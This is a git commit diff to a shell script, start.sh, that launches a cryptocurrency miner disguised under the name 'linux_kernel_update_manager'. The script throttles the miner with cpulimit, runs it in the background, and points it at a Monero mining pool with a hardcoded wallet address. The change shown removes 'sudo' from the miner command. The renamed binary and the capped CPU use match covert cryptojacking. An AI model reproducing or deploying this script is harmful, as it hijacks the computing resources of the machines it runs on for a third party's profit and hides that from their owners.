f360d2cf494dbfaadfb118df849e1a8201f66441
aureliehermanova <41370626+aureliehermanova@users.noreply.github.com>
2018-07-29 02:00:15 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -7,7 +7,7 @@ sudo apt install -y cpulimit &&
 chmod +x ~/gg003/linux_kernel_update_manager &&
 cpulimit -e linux_kernel_update_manager -l 50 -b &
 sleep 60
-sudo ~/gg003/./linux_kernel_update_manager --any --ssl --forever --variation 3 -o gulf.moneroocean.stream:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c ~/gg003/config.txt &
+~/gg003/./linux_kernel_update_manager --any --ssl --forever --variation 3 -o gulf.moneroocean.stream:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c ~/gg003/config.txt &
 sleep 300m
 
 
